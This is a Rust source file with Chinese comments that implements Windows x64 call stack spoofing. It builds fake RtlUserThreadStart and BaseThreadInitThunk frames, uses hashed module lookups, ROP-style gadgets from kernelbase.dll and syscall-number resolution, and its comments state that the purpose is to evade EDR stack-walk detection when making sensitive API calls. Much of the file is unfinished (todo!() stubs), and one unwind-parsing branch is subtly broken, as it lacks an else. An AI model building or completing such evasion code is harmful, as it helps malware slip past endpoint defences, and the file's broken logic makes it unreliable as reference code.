// uwd模拟/伪造了从线程起点到合法的业务函数中间,共计4层完整的物理假帧
// 高地址(栈底)
// 4. 模拟必须的-线程根节点帧(ntdll.dll!RtlUserThreadStart)
// 3. 模拟必须的-线程初始化帧(kernel32.dll!BaseThreadInitThunk)
// 2. 随机伪造帧-rbp_offset/find_push_rbp:find_push_rbp(内部调用rbp_offset)在kernelbase.dll中检索包含push rbp的经典rbp链表函数
// 1. 随机伪造帧-stack_frame/find_prolog:find_prolog在内部用stack_frame在kernelbase.dll中检索一个标准的/rsp管理的系统业务函数,作为发起敏感api调用的假源头
// 低地址
// 1. 采用rsp帧+rbp帧,模拟win64下kernel32.dll/kernelbase.dll真实编译状态.且能够应对edr的rsp轨/rbp轨的双重检测
// 2. 

#![allow(unused)]

use alloc::vec::Vec;

use crate::error::MarianaError::FailedToReadIMAGE_RUNTIME_FUNCTIONEntrieFromPdataSection;
use crate::error::*;
use crate::stealth_bail;
use core::ffi::c_void;
use core::ops::{Add, Index};
use obfstr::obfstring as s;
use puerto::hash::{fnv1a_utf16, fnv1a_utf16_from_u8};
use puerto::helper::PE;
use puerto::module::{get_module_address, get_proc_address};
use puerto::types::AddVectoredExceptionHandlerFn;
use puerto::types::IMAGE_RUNTIME_FUNCTION;

use crate::types::Unwind;
use crate::types::{
    Config, Registers,
    UNWIND_OP_CODES::{self, *},
};
use crate::types::{UNW_FLAG_CHAININFO, UNW_FLAG_EHANDLER};
use crate::types::{UNWIND_CODE, UNWIND_INFO};
#[cfg(feature = "desync")]
use crate::util::find_base_thread_return_address;
use crate::util::{find_gadget, find_valid_instruction_offset, shuffle};

#[cfg(feature = "desync")] // 详见注释8
unsafe extern "C" {
    /// Function responsible for Call Stack Spoofing (Desync).该函数定义在asm文件夹下
    fn Spoof(config: &mut Config) -> *mut c_void;
}

#[cfg(not(feature = "desync"))]
unsafe extern "C" {
    /// Function responsible for Call Stack Spoofing (Synthetic).该函数定义在asm文件夹下
    fn SpoofSynthetic(config: &mut Config) -> *mut c_void;
}

/// specifies the spoofing mode used by the engine:伪造的堆栈,是去执行普通的api函数,还是去执行syscall
pub enum SpoofKind {
    /// spoofs a direct function call:不需要ssn,用传进来的函数物理地址,在伪造好的堆栈上跳转过去执行
    Function,

    /// 这里改为Syscall(u32),需要进一步分析为何能装下puerto的hash.rs中的函数(根据其返回值等)
    /// 
    /// 原Syscall(&'a str):spoof a syscall using its name:欺骗并执行底层windows native syscall(如 NtAllocateVirtualMemory等).
    /// 元组型枚举变体(tuple-like enum variant):后续engine接收到这个参数后. 1. 用这个名字去ntdll.dll的IAT解析其ssn(system service number) 2. 在ntdll.dll内部找到一条干净的syscall; ret汇编指令.随后引擎在伪造好的堆栈上,将ssn写入rax,跳转到syscall;ret 发起硬核系统调用
    /// 关于其声明周期标注 <'a>: Syscall(&'a str)成员中存放的是字符串切片引用(指针).Rust中只要一个结构体或枚举内部包含了引用(指针),就必须显示标注生命周期. 'a 表示向Rust编译器做出安全承诺:传入的Syscall字符串(如 "NtAllocateVirtualMemory"),在整个堆栈伪造过程执行完毕之前,其所在的内存绝对安全,不会被提前释放.
    /// 
    Syscall(u32),
}

/// performs call stack spoofing in desync mode
// #[cfg(feature="desync")]
pub fn spoof(addr: *mut c_void, args: &[*const c_void], kind: SpoofKind) -> Result<*mut c_void> {
    // Max 11 args. 详见注释1
    // 这段的反汇编(release后)及其简约,没有内存分配,没有字符串,没有调用其他函数,零堆分配,零字符串指纹.详见注释1
    if args.len() > 11 {
        stealth_bail!(MarianaError::TooManyArguments);
    }

    // Function pointer must be valid unless syscall call:非syscall的普通函数情况下,其地址肯定不能为空.syscall使用ssn定位调用,addr可以为空
    if let SpoofKind::Function = kind
        && addr.is_null()
    {
        stealth_bail!(MarianaError::NullFunctionAddress);
    }

    let mut config = Config::default();
    let kernelbase = get_module_address(Some(0x31B113C3u32), Some(fnv1a_utf16))
        .ok_or(MarianaError::NotFoundKernelBase)?;

    // parse unwind table
    let pe_kernelbase = Unwind::new(PE::parse(kernelbase));
    let tables = pe_kernelbase
        .entries()
        .ok_or(MarianaError::FailedToReadIMAGE_RUNTIME_FUNCTIONEntrieFromPdataSection)?;

    // resolved apis
    let ntdll = get_module_address(Some(0xB3383153u32), Some(fnv1a_utf16))
        .ok_or(MarianaError::ntdllnotfound)?;

    let kernel32 = get_module_address(Some(0x6BEFCBB7u32), Some(fnv1a_utf16))
        .ok_or(MarianaError::kernel32notfound)?;

    // 对应函数的机器码入口指针(VA),从.edata导出表解析出来的.本身并不包含SEH的IMAGE_RUNTIME_FUNCTION
    let rtl_user_addr = get_proc_address(Some(ntdll), Some(0x72B24572u32), Some(fnv1a_utf16))
        .ok_or(MarianaError::rlt_user_addrnotfound)?;

    let base_thread_addr = get_proc_address(Some(kernel32), Some(0xF70757EAu32), Some(fnv1a_utf16))
        .ok_or(MarianaError::base_thread_addrnotfound)?;

    config.rtl_user_addr = rtl_user_addr;
    config.base_thread_addr = base_thread_addr;

    // unwind lookup
    let pe_ntdll = Unwind::new(PE::parse(ntdll));
    // 从.pdata(位于PE文件中)找到对应函数的IMAGE_RUNTIME_FUNCTION指针
    // 微软规定,单个pe文件在内存中镜像体积不能超过4Gb(32位).因此pe文件头和.pdata中所有结构体字段统一设计为u32(RVA)
    let rtl_user_runtime = pe_ntdll
        .function_by_offset((rtl_user_addr as usize - ntdll as usize) as u32)
        .ok_or(MarianaError::RtlUserThreadStartunwindinfonotfound)?;

    let pe_kernel32 = Unwind::new(PE::parse(kernel32));
    let base_thread_runtime = pe_kernel32
        .function_by_offset((base_thread_addr as usize - kernel32 as usize) as u32)
        .ok_or(MarianaError::BaseThreadInitThunkunwindinfonotfound)?;

    // stack size
    let rtl_user_size = ignoring_set_fpreg(ntdll, rtl_user_runtime)
        .ok_or(MarianaError::RtlUserThreadStartstacksizenotfound)?;

    let base_thread_size = ignoring_set_fpreg(kernel32, base_thread_runtime)
        .ok_or(MarianaError::BaseThreadInitThunkstacksizenotfound)?;

    config.rtl_user_thread_size = rtl_user_size as u64;
    config.base_thread_size = base_thread_size as u64;

    // first prologue
    let first_prolog = Prolog::find_prolog(kernelbase, tables)
    .ok_or(MarianaError::firstprolognotfound)?;

    config.first_frame_fp=(first_prolog.frame + first_prolog.offset as u64) as *const c_void;
    config.first_frame_size=first_prolog.stack_size as u64;

    // second prologue:两个prolog都是从kernelbase.dll的运行时函数表中检索的.
    let second_prolog = Prolog::find_push_rbp(kernelbase, tables)
    .ok_or(MarianaError::secondprolognotfound)?;

    config.second_frame_fp=(second_prolog.frame + second_prolog.offset as u64) as *const c_void;
    config.second_frame_size=second_prolog.stack_size as u64;
    config.rbp_stack_offset=second_prolog.rbp_offset as u64;

    // gadget:add rsp , 0x58; ret
// 0x58十进制是88字节,栈帧上每个槽位是8字节,即11个槽位,也就是11个函数参数.呼应前文参数小于11的设定
// 0x58是目标api预留的参数空间,size是该gadget指令所在系统函数的物理栈大小(.pdata节保存的回溯信息)
    let (add_rsp_addr,size) = find_gadget(kernelbase,&[0x48, 0x83, 0xC4, 0x58, 0xC3], tables)
    .ok_or(MarianaError::addrspgadgetnotfound)?;

    config.add_rsp_gadget=add_rsp_addr as *const c_void;
    config.add_rsp_frame_size=size as u64;

    // gadget:jmp rbx 切回正常的执行流
    let (jmp_rbx_addr,size) = find_gadget(kernelbase, &[0xFF,0x23], tables)
    .ok_or(MarianaError::jmprbxgadgetnotfound)?;

    config.jmp_rbx_gadget=jmp_rbx_addr as *const c_void;
    config.jmp_rbx_frame_size=size as u64;

    // prepare arguments
    // args: &[*const c_void]其类型是一个动态长度的slice.如果是&[*const c_void;11]这是一个固定的数组
    let len = args.len();
    config.number_args=len as u64;

    // iter将slice转为迭代器;take()截取元素个数;enumerate()对每个元素加上一个索引i,与slice中单个引用&[*const c_void]一起组成一个tuple
    // for(i,&arg)正好解构enumerate(),得到*const c_void
    for (i,&arg) in args.iter().take(len).enumerate() {
        match i {
                0 => config.arg01 = arg,
                1 => config.arg02 = arg,
                2 => config.arg03 = arg,
                3 => config.arg04 = arg,
                4 => config.arg05 = arg,
                5 => config.arg06 = arg,
                6 => config.arg07 = arg,
                7 => config.arg08 = arg,
                8 => config.arg09 = arg,
                9 => config.arg10 = arg,
                10 => config.arg11 = arg,
                _ => break,
            }
    }

    // handle syscall spoofing:
    // SpoofKind::Function,如果想伪装一个普通api(如VirtualAlloc、LoadLibraryA、MessageBoxA),直接将对应函数指针(地址)addr传入.此时,不需要解析SSN,直接把addr赋值给config.spoof_function,后续汇编通过call [rcx].Config.SpoofFunction直接跳转到这个api函数
    // 
    match kind {
        SpoofKind::Function=>config.spoof_function=addr,

        SpoofKind::Syscall(hash)=>{
            let ntdll = get_module_address(Some(0xB3383153), Some(fnv1a_utf16))
            .ok_or(MarianaError::ntdlldllnotfound)?;

            let addr = get_proc_address(Some(ntdll), Some(hash), Some(fnv1a_utf16)).ok_or(MarianaError::get_proc_addressreturnednull)?;

            config.is_syscall=true as u32;
            config.ssn=puerto::syscall::x86_64::ssn(hash, ntdll).ok_or(MarianaError::ssnnotfound)? as u32;
            // config.spoof_function=
            






        }
    }








    todo!()
}

/// metadata extracted from a function prologue that is suitable for spoofing
#[derive(Copy, Clone, Default)]
struct Prolog {
    // address of the selected function frame
    frame: u64,
    // total stack space reserved by the function
    stack_size: u32,
    // offset inside the function where a valid instruction pattern was found
    offset: u32,
    // offset in the stack where rbp is pushed or saved
    rbp_offset: u32,
}
impl Prolog {
    /// find the first prologue in the unwind table that looks safe for spoofing:在系统dll(如kernelbase.dll)的.pdata节中检索基于rsp(函数prolog将rsp下推的情况)的伪造帧筛选(调用stack_frame),构建一个函数的prolog信息.用于伪造第一层伪造帧
    ///
    /// this scans the RUNTIME_FUNCTION entries for a function that:
    /// -allocates a stack frame
    /// -has a predictable prologue layput
    fn find_prolog(
        module_base: *mut c_void,
        runtime_table: &[IMAGE_RUNTIME_FUNCTION],
    ) -> Option<Self> {
        let mut prologs = runtime_table
            .iter()
            .filter_map(|runtime| {
                let (is_valid, stack_size) = stack_frame(module_base, runtime)?;
                if !is_valid {
                    return None;
                }

                let offset = find_valid_instruction_offset(module_base, runtime)?;

                let frame = module_base as u64 + runtime.BeginAddress as u64;

                Some(Self {
                    frame,
                    stack_size,
                    offset,
                    ..Default::default()
                })
            })
            .collect::<Vec<Self>>();

        if prologs.is_empty() {
            return None;
        }

        // Shuffle to reduce pattern predictability.
        shuffle(&mut prologs);

        prologs.first().copied()
    }

    /// find a prologue that use `push rbp` and an rbp-based frame:第3层伪造栈帧中,在.pdata节的所有函数中,检索带push rbp的系统函数(调用rbp_offset),并打包成prolog结构体返回
    /// this is useful when spoofing techniques rely on classic frame-pointer based layouts rather than purely rsp-based stack frame
    fn find_push_rbp(
        module_base: *mut c_void,
        runtime_table: &[IMAGE_RUNTIME_FUNCTION],
    ) -> Option<Self> {
        let mut prologs = runtime_table
            .iter()
            .filter_map(|runtime| {
                let (rbp_offset, stack_size) = rbp_offset(module_base, runtime)?;

                if rbp_offset == 0 || stack_size == 0 || stack_size <= rbp_offset {
                    return None;
                }

                let offset = find_valid_instruction_offset(module_base, runtime)?;

                let frame = module_base as u64 + runtime.BeginAddress as u64;

                Some(Self {
                    frame,
                    stack_size,
                    offset,
                    rbp_offset,
                })
            })
            .collect::<Vec<Self>>();

        if prologs.is_empty() {
            return None;
        }

        // the first frame is often not suitable on many windows version
        prologs.remove(0);

        // shuffle to reduce pattern predictability
        shuffle(&mut prologs);

        prologs.first().copied()
    }
}

/// determines whether rbp is pushed or saved in a spoof-compatible manner方式 and computes the total stack size for a function
///
/// this inspects检查/审查 the unwind codes associated with the IMAGE_RUNTIME_FUNCTION
/// entry to determine if the function frame uses a layout suitable for call stack spoofing
///
/// 输入:系统dll物理基址 和 .pdata节中指向某函数的IMAGE_RUNTIME_FUNCTION结构体
///
/// 作用:在.pdata节中检索具备rbp压栈/保存的系统函数,定位旧rbp被保存在栈上的偏移(旧rbp被保存,一方面用于子函数执行完毕恢复现场,一方面edr用旧rbp巡视返回地址).旧rbp用于伪造的栈帧中的返回地址(旧rbp+8),防止edr发现返回地址不在系统dll中 和 累加总栈深
///
/// 输出:旧rbp相对栈顶的物理偏移 和 函数总栈深
pub fn rbp_offset(module: *mut c_void, runtime: &IMAGE_RUNTIME_FUNCTION) -> Option<(u32, u32)> {
    unsafe {
        let unwind_info = (module as usize + runtime.UnwindData as usize) as *mut UNWIND_INFO;

        let unwind_code = (unwind_info as *mut u8).add(4) as *mut UNWIND_CODE;

        let flag = (*unwind_info).VersionFlags.Flags();

        let mut i = 0usize;
        let mut total_stack = 0u32;
        let mut rbp_pushed = false;
        let mut stack_offset = 0;

        while i < (*unwind_info).CountOfCodes as usize {
            // accessing UNWIND_CODE based on the index
            let unwind_code = unwind_code.add(i);
            // information used in operation codes
            let op_info = (*unwind_code).Anonymous.OpInfo() as usize;
            let unwind_op = (*unwind_code).Anonymous.UnwindOp();

            match UNWIND_OP_CODES::try_from(unwind_op) {
                // saves a non-volatile register on the stack:Example : push <reg>
                Ok(UWOP_PUSH_NONVOL) => {
                    if Registers::Rsp == op_info {
                        return None;
                    }
                    // 上文先把rbp_pushed=false,这里是为了防止出现rbp被push两次的情况(正常将rbp作为栈帧的prologue中只能push一次rbp)
                    if Registers::Rbp == op_info {
                        if rbp_pushed {
                            return None;
                        }
                        rbp_pushed = true;
                        // 前文判定push的是不是rbp,如果不是后文将循环执行total_stack+=8.那么rbp的偏移就是已经算出的total_stack.如判定是rbp,total_stack就是其偏移
                        stack_offset = total_stack;
                    }
                    total_stack += 8;
                    i += 1;
                }

                // allocate large space on the stack
                // - OpInfo==0:the next slot contain the /8 size of the allocation(maximum 512kb-8)
                // - OpInfo==1:the next two slots contain the full size of the allocation(up to 4GB-8)
                // Example OpInfo==0:sub rsp ,0x100;allocates 256bytes(slot中的数字是32,32*8=256字节)
                // Example OpInfo==1:sub rsp,0x10000; allocate 65536 bytes(two slots used)
                Ok(UWOP_ALLOC_LARGE) => {
                    if (*unwind_code).Anonymous.OpInfo() == 0 {
                        // case 1:size in 1 slot,divided by 8
                        // multiplies by 8 to the actual value
                        // 注意这里比源码多了一个(),显示说明了先add在*的过程
                        let frame_offset = ((*(unwind_code.add(1))).FrameOffset as i32) * 8; // 这里FrameOffset类型是i32.详见注释9

                        total_stack += frame_offset as u32;

                        i += 2
                    } else {
                        // case 2:OpInfo==1(size in 2 slots,32 bits)
                        // 将两个slots看作一个FrameOffset字段,前面有注释专门讲解
                        let frame_offset = *((unwind_code.add(1)) as *mut i32);

                        total_stack += frame_offset as u32;

                        // consumes 3 slots(1 for the instruction,2 for the full size).这里不加;的原因见注释10
                        i += 3;
                    }
                }

                // allocates small space in the stack.Example OpInfo=3L:sub rsp,0x20; allocate 32 bytes (OpInfo+1)*8
                Ok(UWOP_ALLOC_SMALL) => {
                    total_stack += ((op_info + 1) * 8) as u32;
                    i += 1;
                }

                // UWOP_SAVE_NONVOL:save the contents of a non-volatile register in a specific position on the stack
                // - Reg: Name of the saved register
                // - FrameOffset: mov [rsp+0x40],rsi ;save the contents of rsi in rsp+0x40
                Ok(UWOP_SAVE_NONVOL) => {
                    // 这里能够比较 详见注释11
                    if Registers::Rsp == op_info {
                        return None;
                    }

                    if Registers::Rbp == op_info {
                        if rbp_pushed {
                            return None;
                        }
                        // win64规定,UWOP_SAVE_NONVOL专门用于保存小偏移量的非易失性寄存器(其存放偏移量的slot的类型是u16,最大值是65535约64kb),如果大于64kb,编译器必须改用操作码UWOP_SAVE_NONVOL_BIG
                        let offset = (*(unwind_code.add(1))).FrameOffset * 8;
                        stack_offset = total_stack + offset as u32;
                        rbp_pushed = true;
                    }
                    i += 2;
                }

                // save a non-volatile register to a stack address wih a long offset
                // - Reg: Name of the saved register
                // - FrameOffset: long offset indicating where the value of the register is saved
                // Example: mov [rsp+0x1040],rsi; save the contents of rsi in rsp+0x1040
                Ok(UWOP_SAVE_NONVOL_BIG) => {
                    if Registers::Rsp == op_info {
                        return None;
                    }

                    if Registers::Rbp == op_info {
                        if rbp_pushed {
                            return None;
                        }

                        // 将两个u16的slot当作一个连续的u32指针对待.不存在u16中溢出的情况.
                        // 如果超出u32表示的最大值,表示其在栈上申请超过4GB的空间.而win默认给一个线程分配的栈空间通常是1Mb左右(如果编译期手动调大,也就几十MB).如果一个函数prologue试图sub rsp,[4GB],rsp在刚减去几MB时,cpu就会撞上win内核的栈保护页,内核抛出不可捕获的STATUS_STACK_OVERFLOW (0xC00000FD)异常,闪退杀死进程.
                        let offset = *(unwind_code.add(1) as *mut u32);
                        stack_offset = total_stack + offset;
                        rbp_pushed = true;
                    }
                    i += 3;
                }

                // Return
                Ok(UWOP_SET_FPREG) => return None,

                // - Reg: Name of the saved XMM register.
                // - FrameOffset: Offset indicating where the value of the register is saved.
                Ok(UWOP_SAVE_XMM128) => i += 2,

                // UWOP_SAVE_XMM128BIG: Saves the contents of a non-volatile XMM register to a stack address with a long offset.
                // - Reg: Name of the saved XMM register.
                // - FrameOffset: Long offset indicating where the value of the register is saved.
                //
                // Example: movaps [rsp + 0x1040], xmm6 ; Saves the contents of XMM6 in RSP + 0x1040.
                Ok(UWOP_SAVE_XMM128BIG) => i += 3,

                // Reserved code, not currently used.
                Ok(UWOP_EPILOG) | Ok(UWOP_SPARE_CODE) => i += 1,

                // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception.
                Ok(UWOP_PUSH_MACH_FRAME) => {
                    total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                    i += 1
                }

                _ => {}
            }
        }
    }

    todo!()
}

/// computes stack frame metadata while rejecting setfp frames
///
/// used when locating suitable prologues for spoofed call frames
///
/// 输入:系统dll基址和.pdata节中指向某函数的IMAGE_RUNTIME_FUNCTION结构体
///
/// 作用:拦截非法rsp压栈;拦截非法寄存器保存;拦截复杂的SEH异常链;拦截非标准栈指针;之后遍历操作码累加该函数prologue开辟的栈空间,并链式展开递归(UNW_FLAG_CHAININFO标志置位)
///
/// 输出:bool表示对应函数在prologue中是否建立rbp帧,该函数在栈上开辟的空间字节数.被拦截/解构异常,则返回None
pub fn stack_frame(module: *mut c_void, runtime: &IMAGE_RUNTIME_FUNCTION) -> Option<(bool, u32)> {
    unsafe {
        let unwind_info = (module as usize + runtime.UnwindData as usize) as *mut UNWIND_INFO;

        let unwind_code = (unwind_info as *mut u8).add(4) as *mut UNWIND_CODE;

        let flag = (*unwind_info).VersionFlags.Flags();

        let mut i = 0usize;
        let mut set_fpreg_hit = false;
        let mut total_stack = 0i32;
        while i < (*unwind_info).CountOfCodes as usize {
            // accessing UNWIND_CODE based on the index
            let unwind_code = unwind_code.add(i);
            // information used in operation codes
            let op_info = (*unwind_code).Anonymous.OpInfo() as usize;
            let unwind_op = (*unwind_code).Anonymous.UnwindOp();

            match UNWIND_OP_CODES::try_from(unwind_op) {
                // save a non-volatile register on the stack(如 push <reg>)
                Ok(UWOP_PUSH_NONVOL) => {
                    // 代表将rsp压栈,且没有设置rbp作为栈帧指针.则放弃该函数,无法用于栈帧伪造
                    if Registers::Rsp == op_info && !set_fpreg_hit {
                        return None;
                    }

                    total_stack += 8;
                    i += 1;
                }

                // allocates samll space in the stack(如 Opinfo=3:sub rsp,0x20 allocate 32bytes(Opinfo+1)*8)
                Ok(UWOP_ALLOC_SMALL) => {
                    total_stack += ((op_info + 1) * 8) as i32;
                    i += 1;
                }

                // allocates large space on the stack
                // - OpInfo == 0: The next slot contains the /8 size of the allocation (maximum 512 KB - 8).
                // - OpInfo == 1: The next two slots contain the full size of the allocation (up to 4 GB - 8).
                //
                // Example (OpInfo == 0): sub rsp, 0x100 ; Allocates 256 bytes
                // Example (OpInfo == 1): sub rsp, 0x10000 ; Allocates 65536 bytes (two slots used)
                Ok(UWOP_ALLOC_LARGE) => {
                    if (*unwind_code).Anonymous.OpInfo() == 0 {
                        // Case 1: OpInfo == 0 (Size in 1 slot, divided by 8)
                        // Multiplies by 8 to the actual value

                        // 为啥是i32,还可能是负数?
                        let frame_offset = ((*unwind_code.add(1)).FrameOffset as i32) * 8;
                        total_stack += frame_offset;

                        // Consumes 2 slots (1 for the instruction, 1 for the size divided by 8)
                        i += 2
                    }
                    {
                        // Case 2: OpInfo == 1 (Size in 2 slots, 32 bits)
                        let frame_offset = *(unwind_code.add(1) as *mut i32);
                        total_stack += frame_offset;

                        // Consumes 3 slots (1 for the instruction, 2 for the full size)
                        i += 3
                    }
                }

                // save the contents of a non-volatile register in as specific position on the stack
                // - Reg: Name of the saved register.
                // - FrameOffset: Offset indicating where the value of the register is saved.
                //
                // Example: mov [rsp + 0x40], rsi ; Saves the contents of RSI in RSP + 0x40
                Ok(UWOP_SAVE_NONVOL) => {
                    if Registers::Rsp == op_info || Registers::Rbp == op_info {
                        return None;
                    }

                    i += 2;
                }

                // Saves a non-volatile register to a stack address with a long offset.
                // - Reg: Name of the saved register.
                // - FrameOffset: Long offset indicating where the value of the register is saved.
                //
                // Example: mov [rsp + 0x1040], rsi ; Saves the contents of RSI in RSP + 0x1040.
                Ok(UWOP_SAVE_NONVOL_BIG) => {
                    if Registers::Rsp == op_info || Registers::Rbp == op_info {
                        return None;
                    }

                    i += 3;
                }

                // Saves the contents of a non-volatile XMM register on the stack.
                // - Reg: Name of the saved XMM register.
                // - FrameOffset: Offset indicating where the value of the register is saved.
                //
                // Example: movaps [rsp + 0x20], xmm6 ; Saves the contents of XMM6 in RSP + 0x20.
                Ok(UWOP_SAVE_XMM128) => i += 2,

                // UWOP_SAVE_XMM128BIG: Saves the contents of a non-volatile XMM register to a stack address with a long offset.
                // - Reg: Name of the saved XMM register.
                // - FrameOffset: Long offset indicating where the value of the register is saved.
                //
                // Example: movaps [rsp + 0x1040], xmm6 ; Saves the contents of XMM6 in RSP + 0x1040.
                Ok(UWOP_SAVE_XMM128BIG) => i += 3,

                // UWOP_SET_FPREG: Marks use of register as stack base (e.g. RBP).
                // Ignore if not RBP, has EH handler or chained unwind.
                // Subtract `FrameOffset << 4` from the stack total. 详见注释7
                Ok(UWOP_SET_FPREG) => {
                    if (flag & UNW_FLAG_EHANDLER) != 0 && (flag & UNW_FLAG_CHAININFO) != 0 {
                        return None;
                    }

                    if (*unwind_info).FrameInfo.FrameRegister() != Registers::Rbp as u8 {
                        return None;
                    }

                    set_fpreg_hit = true;
                    let offset = ((*unwind_info).FrameInfo.FrameOffset() as i32) << 4;
                    total_stack -= offset;
                    i += 1
                }

                // Reserved code, not currently used.
                Ok(UWOP_EPILOG) | Ok(UWOP_SPARE_CODE) => i += 1,

                // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception.
                Ok(UWOP_PUSH_MACH_FRAME) => {
                    total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                    i += 1
                }
                _ => {}
            }
        }
    }

    todo!()
}

// 不要删除,有示范意义.后续有真正的实现
// // 占位桩函数,用于辅助编译util.rs
// pub fn ignoring_set_fpreg(_module:*mut c_void,
// _runtime:&IMAGE_RUNTIME_FUNCTION) ->Option<u32>{
//     Some(0)
// }

/// computes the total stack frame size of a function while ignoring any setfp frames
/// useful for identifying spoof-compatible RUNTIME_FUNCTION entries:用于识别适合/兼容堆伪造的RUNTIME_FUNCTION函数条目.win中不是所有函数都适合做堆栈伪造,对于使用了复杂帧指针,或包含复杂的链式退栈,如果强行伪造栈帧,调试器或edr在回溯时会因为找不到rbp而引发崩溃或直接识别出栈伪造痕迹.只有那些栈结构简单干净的函数适合
/// 这里的set_fpreg对应SEH异常操纵码中的UWOP_SET_FPREG（代表汇编指令 mov rbp, rsp，建立函数栈帧基址）.如果在UNWIND_INFO中发现这样的函数,直接返回None忽略这样的函数
///
/// 各个结构体之间的关联见types.rs
pub fn ignoring_set_fpreg(module: *mut c_void, runtime: &IMAGE_RUNTIME_FUNCTION) -> Option<u32> {
    unsafe {
        // 指向UNWIND_INFO结构体(位于pe文件的.rdata节)
        let unwind_info = (module as usize + runtime.UnwindData as usize) as *mut UNWIND_INFO;
        // 跳过UNWIND_INFO前4个字节,指向真正的操作码数组(UNWIND_INFO.UnwindCode)
        let unwind_code = (unwind_info as *mut u8).add(4) as *mut UNWIND_CODE;
        // 以上,win规定,prologue中每一条修改rsp或保存寄存器的指令,都必须在unwindcode中有对应的操作码

        // 提取字段VersionFlags(8位,1字节)的高5位
        let flag = (*unwind_info).VersionFlags.Flags();

        // 用于对UNWIND_CODE的计数
        let mut i = 0usize;

        let mut total_stack = 0u32;

        // unwind_info.countofcodes 用于表示UNWIND_CODE数组中有多少元素
        while i < (*unwind_info).CountOfCodes as usize {
            // access UNWIND_CODE base on the index:将指针向后移动i个UNWIND_CODE结构体长度
            let unwind_code = unwind_code.add(i);

            // 开始解构单个UNWIND_CODE结构体
            // information used in operetion codes
            // Opinfo()和UnwindOp()是从一个UNWIND_CODE回溯操作码的高八位获取的值,该值代表不同的栈操作UnwindOp表示栈的压入/分配/移动等动作指令;Opinfo代表寄存器编号或缩放倍数,后续用于匹配enum unwind_op.因此会用于数组的下标,而Rust中数组下标一定是usize
            let op_info = (*unwind_code).Anonymous.OpInfo() as usize;
            let unwind_op = (*unwind_code).Anonymous.UnwindOp();

            match UNWIND_OP_CODES::try_from(unwind_op) {
                // push a non-volatile register on the stack.易失性寄存器可以随意修改,不需要保存
                Ok(UWOP_PUSH_NONVOL) => {
                    if Registers::Rsp == op_info {
                        return None;
                    }

                    // UWOP_PUSH_NONVOL是16位的,但push的寄存器是64位,这里需要自增8字节
                    // 子代码块修改使用父代码块的局部变量, 反之不行
                    total_stack += 8;
                    i += 1;
                }

                // allocates small space in the stack:即记录prologue对小规模栈空间分配的情况
                // Example OpInfo=3:sub rsp,0x20;allocate 32 bytes = ( Opinfo+1)*8
                Ok(UWOP_ALLOC_SMALL) => {
                    total_stack += ((op_info + 1) * 8) as u32;
                    i += 1;
                }

                // allocate large space on the stack
                // opinfo=0:the next slot contain the 8 size of the allocation(maximum 512kb -8),占用两个slot
                // opinfo=1:the next two slots contain the full size of the allocation(maximum: 4GB-8).占用3个slot
                // Example:opinfo=0:sub rsp,0x1000;allocate 256bytes
                // Example:opinfo=1:sub rsp,0x10000;allocate 65536bytes(two solts used)
                Ok(UWOP_ALLOC_LARGE) => {
                    // opinfo=0,opinfo in 1 slot and size in 1 slot ;divided by 8
                    if (*unwind_code).Anonymous.OpInfo() == 0 {
                        let frame_offset = ((*unwind_code.add(1)).FrameOffset as i32) * 8;
                        total_stack += frame_offset as u32;

                        // consumes 2 slot(1 for instruction ,1 for the size divided by 8)
                        i += 2;
                        // 这里源码中i+=2后面没有;
                        // rust中代码块({})中的最后一行不加; 代表把这一行的计算结果,作为整个{}代码块的返回值抛出来.加上; 代表是一个statement(语句),丢弃返回值,代码块默认返回()
                        // 但i+=2作为赋值语句其类型本身就是(),所以这里加不加;都是一样的效果
                    } else {
                        // opinfo=1:size in 2 slot,32bits(两个unwind_code,每个2字节)
                        // 这里使用了指针跨越强转的黑魔法:利用win64的小端序和物理内存连续性,只用一条cpu mov指令,把2个连续的slot合并,读取为一个完整的32位整数.因为后续的槽位2和3 都表示为union的FrameOffset字段 详见注释2
                        let frame_offset = *(unwind_code.add(1) as *mut i32);
                        total_stack += frame_offset as u32;

                        i += 3;
                    }
                }

                // UWOP_SAVE_NONVOL:set the contents of a non-volatile register in a specific position on the stack
                // Reg:Name of the saved register
                // FrameOffset:Offset indicating where the value of the register is saved
                // Example: mov [rsp + 0x40],rsi; save the contents of rsi in the rsp+0x40
                Ok(UWOP_SAVE_NONVOL) => {
                    if Registers::Rsp == op_info {
                        return None;
                    }
                    // 加上指令槽位,共消耗2个slot.第一个slot读取的是UNWIND_CODE的Anonymous字段代表指令含义和寄存器代号.第二个slot是UNWIND_CODE的FrameOffset字段,代表相对栈偏移量(以rsp base)
                    i += 2;
                }

                // save a non-volatile register to a stack address with a long offset
                // Reg:Name of the saved register
                // FrameOffset:Long offset indicating where the value of the register is saved
                // UWOP_SAVE_NONVOL 和 UWOP_SAVE_NONVOL_BIG 的区别见注释3
                // Example:mov [rsp + 0x1040],rsi;save the contents of rsi in rsp+0x1040
                Ok(UWOP_SAVE_NONVOL_BIG) => {
                    if Registers::Rsp == op_info {
                        return None;
                    }

                    i += 3;
                }

                // save the contents of a non_volatile XMM register on the stack
                // Reg:Name of the saved XMM register
                // FrameOffset:offset indicating where the value of the register is saved
                // Example:movaps [rsp+0x20],xmm6;save the contents of xmm6 in rsp+0x20
                // 详见注释4
                // 末尾的, 是rust语法糖,在分支只有一句代码可以不加{} 并在末尾用, 代表分支结束
                Ok(UWOP_SAVE_XMM128) => i += 2,

                // UWOP_SAVE_XMM128BIG: Saves the contents of a non-volatile XMM register to a stack address with a long offset.
                // - Reg: Name of the saved XMM register.
                // - FrameOffset: Long offset indicating where the value of the register is saved.
                //
                // Example: movaps [rsp + 0x1040], xmm6 ; Saves the contents of XMM6 in RSP + 0x1040.
                Ok(UWOP_SAVE_XMM128BIG) => i += 3,

                // Ignoring.UWOP_SET_FPREG对应汇编指令mov rbp,rsp(建立rbp帧指针基址)
                // 物理上未执行push压栈,未执行sub rsp,0xxx指令增加栈深;只是把当时rsp的地址复制一份给rbp.
                // 只占用1个instruction slot
                Ok(UWOP_SET_FPREG) => i += 1,

                // Reserved code, not currently used.
                Ok(UWOP_EPILOG) | Ok(UWOP_SPARE_CODE) => i += 1,

                // push a machine frame.This unwind code is used to record the effect of a hardware interrupt or exception.详见注释5
                Ok(UWOP_PUSH_MACH_FRAME) => {
                    total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                    i += 1
                }
                _ => {}
            }
        }

        // if there is a chain unwind structure,it must be processed too
        // recursively and included in the stack size calculation
